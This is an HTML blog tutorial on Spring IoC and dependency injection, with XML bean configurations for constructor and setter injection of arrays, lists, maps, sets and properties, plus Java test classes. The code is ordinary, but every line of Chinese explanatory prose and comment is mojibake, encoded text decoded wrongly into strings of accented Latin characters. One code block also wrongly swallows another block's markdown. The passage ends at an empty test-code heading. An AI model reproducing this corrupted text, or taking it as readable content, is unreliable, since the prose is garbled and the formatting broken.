<h5 id="4-IOCåˆ›å»ºå¯¹è±¡"><a href="#4-IOCåˆ›å»ºå¯¹è±¡" class="headerlink" title="4.IOCåˆ›å»ºå¯¹è±¡"></a>4.IOCåˆ›å»ºå¯¹è±¡</h5><p>â€‹    1.é»˜è®¤ç›´æ¥åˆ›å»ºçš„æ—¶å€™åˆ©ç”¨çš„æ— å‚æ„é€ æ–¹æ³•</p>
<p>â€‹    2.æœ‰å‚æ„é€ çš„æ—¶å€™æˆ‘ä»¬æœ‰ä¸‰ç§æ–¹å¼æ¥å¯¹å‚æ•°è¿›è¡Œæ„é€ ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--   é”®å¯¹å€¼çš„æ–¹å¼ï¼Œæœ€ç®€å•--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span></span><br><span class="line">        </span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        ç”¨ä¸‹æ ‡æ¥èµ‹å€¼--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wuhu&quot;</span>/&gt;</span>  <span class="comment">&lt;!--        ç”¨ç±»å‹æ¥èµ‹å€¼ï¼Œä¸æ¨èä½¿ç”¨--&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>æ³¨æ„äº‹é¡¹:</strong></p>
<p>â€‹        åœ¨Springå½“ä¸­ï¼Œå®é™…ä¸Šå½“æˆ‘ä»¬åˆ©ç”¨Springè¿›è¡ŒContextçš„åˆ›å»ºçš„æ—¶å€™ï¼ŒSpringå·²ç»å°†<strong>å…¨éƒ¨å¯¹è±¡å¯¼å…¥</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯</span></span><br><span class="line">HelloSpring hello = (HelloSpring) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(hello.tostring());</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ çš„Beanå½“ä¸­å³ä½¿å«æœ‰å¤šä¸ªç±»ï¼ŒSpringä¹Ÿå°†ä»–ä»¬å…¨éƒ¨å¯¼å…¥å¹¶åˆå§‹åŒ–ï¼Œç”¨æˆ·æƒ³è¦ä»€ä¹ˆå»å–å‡ºæ¥å³å¯ã€‚</p>
<h5 id="5-Springçš„é…ç½®"><a href="#5-Springçš„é…ç½®" class="headerlink" title="5.Springçš„é…ç½®"></a>5.Springçš„é…ç½®</h5><ul>
<li><p>åˆ«å(å·²æ²¡ç”¨äº†)</p>
</li>
<li><p>Beançš„é…ç½®</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> <span class="attr">name</span>=<span class="string">&quot;u1,u2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œçš„idå°±æ˜¯æ³¨å†Œåï¼Œclasså°±æ˜¯è°ƒç”¨ç±»<strong>nameå·²ç»å¯ä»¥å–åˆ«åäº†ï¼</strong></p>
</li>
<li><p>Import</p>
<p>ä¾¿äºå¤šäººè¿åŠ¨ï¼Œå¤§ä¼™ä¸€èµ·å¼€å‘çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°†ä»–ä»¬åŒ…å«åœ¨ä¸€èµ·äº†~</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;beans.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h5 id="6-DIä¾èµ–æ³¨å…¥"><a href="#6-DIä¾èµ–æ³¨å…¥" class="headerlink" title="6.DIä¾èµ–æ³¨å…¥"></a>6.DIä¾èµ–æ³¨å…¥</h5><p>â€‹        </p>
<h6 id="6-1æ„é€ æ–¹æ³•æ³¨å…¥"><a href="#6-1æ„é€ æ–¹æ³•æ³¨å…¥" class="headerlink" title="6.1æ„é€ æ–¹æ³•æ³¨å…¥"></a>6.1æ„é€ æ–¹æ³•æ³¨å…¥</h6><p>â€‹    é‡å†™æ„é€ æ–¹æ³•</p>
<h6 id="6-2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘"><a href="#6-2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘" class="headerlink" title="6.2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘"></a>6.2setæ–¹æ³•æ³¨å…¥ã€é‡ç‚¹ã€‘</h6><p>â€‹    ä¾èµ–ï¼šbeansçš„å¯¹è±¡ä¾èµ–äºå®¹å™¨ï¼</p>
<p>â€‹    æ³¨å…¥ï¼šbeadå½“ä¸­çš„æ‰€æœ‰å±æ€§Â·ï¼Œç”±å®¹å™¨æ¥æ³¨å…¥ã€‚</p>
<p><strong>ã€ç¯å¢ƒæ­å»ºã€‘</strong></p>
<p>â€‹    1.å¤æ‚ç±»å‹</p>
<pre><code> 2.çœŸå®æµ‹è¯•å¯¹è±¡</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String string;</span><br><span class="line">    <span class="keyword">private</span> String[] book;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; hobbies;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String,String&gt; card;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; games;</span><br><span class="line">    <span class="keyword">private</span> String wife;</span><br><span class="line">    <span class="keyword">private</span> Properties info;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>â€‹    3.beans.xml</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;!--    æ™®é€šæ³¨å…¥--&gt;</span><br><span class="line">    &lt;bean id=<span class="string">&quot;hello&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.HelloSpring&quot;</span> name=<span class="string">&quot;u1,u2&quot;</span>&gt;</span><br><span class="line">        &lt;constructor-arg name=<span class="string">&quot;str&quot;</span> value=<span class="string">&quot;www&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--        refæ³¨å…¥--&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    &lt;bean  id=<span class="string">&quot;address2&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Address&quot;</span> /&gt;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    &lt;bean <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.ysllz.pojo.Student&quot;</span> id=<span class="string">&quot;student&quot;</span>&gt;</span><br><span class="line">&lt;!--æ•°ç»„æ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;book&quot;</span>&gt;</span><br><span class="line">            &lt;array&gt;</span><br><span class="line">            &lt;value&gt;çº¢æ¥¼æ¢¦&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;æ°´æµ’ä¼ &lt;/value&gt;</span><br><span class="line">            &lt;value&gt;ä¸‰å›½æ¼”ä¹‰&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;è¥¿æ¸¸è®°&lt;/value&gt;</span><br><span class="line">            &lt;/array&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--listæ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;hobbies&quot;</span>&gt;</span><br><span class="line">            &lt;list&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;èµ·é£&lt;/value&gt;</span><br><span class="line">            &lt;/list&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        mapæ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;card&quot;</span>&gt;</span><br><span class="line">            &lt;map&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;èº«ä»½è¯&quot;</span> value=<span class="string">&quot;440000000032001&quot;</span>/&gt;</span><br><span class="line">                &lt;entry key=<span class="string">&quot;é“¶è¡Œå¡&quot;</span> value=<span class="string">&quot;2213123032001&quot;</span>/&gt;</span><br><span class="line">            &lt;/map&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">&lt;!--        setæ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;games&quot;</span>&gt;</span><br><span class="line">            &lt;set&gt;</span><br><span class="line">                &lt;value&gt;lol&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;cod&lt;/value&gt;</span><br><span class="line">                &lt;value&gt;bot&lt;/value&gt;</span><br><span class="line">            &lt;/set&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line"></span><br><span class="line">        &lt;property name=&quot;wife&quot; &gt;&lt;null/&gt;&lt;/property&gt;</span><br><span class="line">&lt;!--        é…ç½®æ³¨å…¥--&gt;</span><br><span class="line">        &lt;property name=<span class="string">&quot;info&quot;</span>&gt;</span><br><span class="line">            &lt;props&gt;</span><br><span class="line">                &lt;prop key=&quot;username&quot;&gt;351452024&lt;/prop&gt;</span><br><span class="line">                &lt;prop key=&quot;password&quot;&gt;3125224&lt;/prop&gt;</span><br><span class="line">            &lt;/props&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>â€‹    4.æµ‹è¯•ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mytest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        è·å–springçš„ä¸Šä¸‹æ–‡å¯¹è±¡</span></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"><span class="comment">//        æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨Springçš„ç®¡ç†å³å¯</span></span><br><span class="line">        Student student = (Student) context.getBean(<span class="string">&quot;student&quot;</span>);</span><br><span class="line">        System.out.println(student.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h6 id="6-3å…¶ä»–æ–¹æ³•æ³¨å…¥"><a href="#6-3å…¶ä»–æ–¹æ³•æ³¨å…¥" class="headerlink" title="6.3å…¶ä»–æ–¹æ³•æ³¨å…¥"></a>6.3å…¶ä»–æ–¹æ³•æ³¨å…¥</h6><p>P,å°±æ˜¯setæ³¨å…¥ï¼ŒCå°±æ˜¯åˆ›é€ å™¨æ³¨å…¥</p>
<h1 id="1-Springçš„beançš„æœ¬è´¨"><a href="#1-Springçš„beançš„æœ¬è´¨" class="headerlink" title="1.Springçš„beançš„æœ¬è´¨"></a>1.Springçš„beançš„æœ¬è´¨</h1><p>å®é™…ä¸Šå°±æ˜¯åè½¬ï¼Œæ³¨å…¥çš„å€¼ï¼Œåˆ›å»ºå¯¹è±¡å…¨éƒ¨äº¤ç»™Springçš„XMLæ¥é…ç½®äº†ï¼å®é™…ä¸Šå°±æ˜¯åˆ©ç”¨Setæ³¨å…¥</p>
<p>å›é¡¾æ˜¨å¤©çš„ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æˆ‘ä»¬ç…§æ ·æ˜¯new äº†ä¸€ä¸ªæ–°çš„å¯¹è±¡</span></span><br><span class="line"><span class="keyword">package</span> com.ys.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSQLServer</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SQLSERVER use it&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡å†™DAOå±‚çš„æ–¹æ³•ï¼Œä¹‹ååœ¨serviceå±‚å½“ä¸­è¿›è¡Œæ“ä½œï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†™ä¸€ä¸ªå®ç°æ¥å£ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceimpl</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UserDao <span class="title">getUserDao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘ä»¬è¿™é‡Œè®¾ç½®äº†ä¸€ä¸ªSetæ–¹æ³•ï¼Œè®©userDaoå…è®¸ç”¨æˆ·çš„è‡ªå®šä¹‰åˆ›å»ºï¼Œé‚£ä¹ˆä»–éœ€è¦ä»€ä¹ˆæˆ‘ä»¬å°±ç»™ä»€ä¹ˆ~</p>
<p>æœ€ç»ˆæµ‹è¯•ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.dao.UserDao;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserDaoimpl;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserMysql;</span><br><span class="line"><span class="keyword">import</span> com.ys.dao.UserSQLServer;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserService;</span><br><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        ç”¨æˆ·å®é™…è°ƒç”¨çš„æ˜¯ä¸šåŠ¡å±‚ï¼ŒDaoå±‚ä¸å…è®¸ä»–ä»¬æ¥è§¦ï¼</span></span><br><span class="line">        UserServiceimpl userServiceimpl = <span class="keyword">new</span> UserServiceimpl();</span><br><span class="line"></span><br><span class="line">        userServiceimpl.setUserDao(<span class="keyword">new</span> UserSQLServer());</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯åœ¨springå½“ä¸­ï¼Œspringå¸®æˆ‘ä»¬æ“ä½œäº†ä»€ä¹ˆï¼Ÿ</p>
<p>æˆ‘ä»¬æ²¡æœ‰NEWä»»ä½•ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬åšçš„æ˜¯å»Springçš„beanä¸‹é…ç½®xml~</p>
<p>æˆ‘ä»¬å¦‚ä¸‹æ„é€ xmlï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--    ä½¿ç”¨springæ¥åˆ›å»ºæˆ‘ä»¬çš„å¯¹è±¡,åœ¨springä¸­éƒ½æˆä¸ºBean--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    ç°åœ¨ä¸€ä¸ªBeanç›¸å½“äºnew äº†ä¸€ä¸ªå¯¹è±¡--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--   æˆ‘ä»¬åœ¨XMLå½“ä¸­å»é…ç½®äº†--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userMySQL&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserMysql&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userOranle&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserOranle&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userSQLServer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.dao.UserSQLServer&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userServiceimpl&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.service.UserServiceimpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userMySQL&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>bean å°±ç›¸å½“äºnewäº†è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œrefåˆ™æ˜¯å–beanå½“ä¸­å·²ç»åˆ›å»ºå¥½çš„ç±»ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬çš„æµ‹è¯•ä»£ç ä¿®æ”¹åä¸ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ys.service.UserServiceimpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInMine</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean1.xml&quot;</span>);</span><br><span class="line">        UserServiceimpl userServiceimpl = (UserServiceimpl) 		      context.getBean(<span class="string">&quot;userServiceimpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        userServiceimpl.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼"><a href="#2-IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼" class="headerlink" title="2 IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼"></a>2 IOCåˆ›å»ºå¯¹è±¡çš„æ–¹å¼</h1><p>1.ä½¿ç”¨æ— å‚æ„é€  é»˜è®¤åˆ›å»º</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">////        System.out.println(&quot;wdndmd&quot;);</span></span><br><span class="line"><span class="comment">////    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span>+name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘åœ¨è¿™ç›´æ¥å°†æ— å‚æ„é€ å»é™¤ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æ— æ³•æ„å»ºçš„é—®é¢˜ï¼Œä½†æ˜¯Springä¹Ÿæ”¯æŒä½¿ç”¨æœ‰å‚æ„é€ </p>
<p>æ„é€ å™¨å‡½æ•°æœ‰ä¸‰ç§æ–¹å¼ï¼š</p>
<ul>
<li><p>ç¬¬ä¸€ç§ï¼Œä¸‹æ ‡èµ‹å€¼</p>
</li>
<li><pre><code class="xml">&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt;
    &lt;constructor-arg index=&quot;0&quot; value=&quot;wdnmd&quot;/&gt;
&lt;/bean&gt;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ ç¬¬äºŒç§ï¼Œå‚æ•°ç±»å‹åŒ¹é…</span><br><span class="line"></span><br><span class="line">+ &#96;&#96;&#96;xml</span><br><span class="line">  &lt;bean id&#x3D;&quot;user&quot; class&#x3D;&quot;com.ys.pojo.User&quot;&gt;</span><br><span class="line">      &lt;constructor-arg type&#x3D;&quot;java.lang.String&quot; value&#x3D;&quot;www&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure></code></pre>
</li>
<li><p>é€šè¿‡å‚æ•°åæ¥è¿›è¡Œèµ‹å€¼</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.User&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;www&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>è¦æ³¨æ„ï¼š</p>
<ul>
<li>æˆ‘ä»¬å¦‚æœä½¿ç”¨äº†æœ‰å‚æ„é€ ï¼Œspringå°±ä¸ä¼šèµ°æ— å‚æ„é€ çš„æ–¹æ³•äº†</li>
<li>åªè¦æˆ‘ä»¬ä½¿ç”¨new ClassPathXmlApplicationContextåˆ›å»ºï¼Œå°±ä¼šæŠŠXMLå½“ä¸­çš„ç±»å…¨éƒ¨æ³¨å…¥è¿›å»ï¼Œåˆ›å»ºæ–°ç±»</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ys.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;userTè¢«åˆ›å»ºäº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserT</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚æˆ‘ä»¬åˆ›å»ºè¯¥javaç±»</p>
<p>å¹¶åœ¨beanä¸­æ‰«æï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;user&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¾¿ä¸ä¼šå¾—åˆ°æ„é€ å™¨åº”è¯¥è¿”å›é‚£å¥è¯ï¼Œä½†å¦‚æœæˆ‘ä»¬å»æ‰ä¸Šé¢çš„</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.ys.pojo.UserT&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ™ä¼šå¾—åˆ°æ„é€ å™¨å½“ä¸­çš„è¯</p>
<p>åŒæ—¶æˆ‘ä»¬è¦çŸ¥é“ï¼Œæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™æ˜¯ä¸€æ ·çš„beanï¼Œå¯¹è±¡å¹¶æ²¡æœ‰åŒºåˆ«ï¼š</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
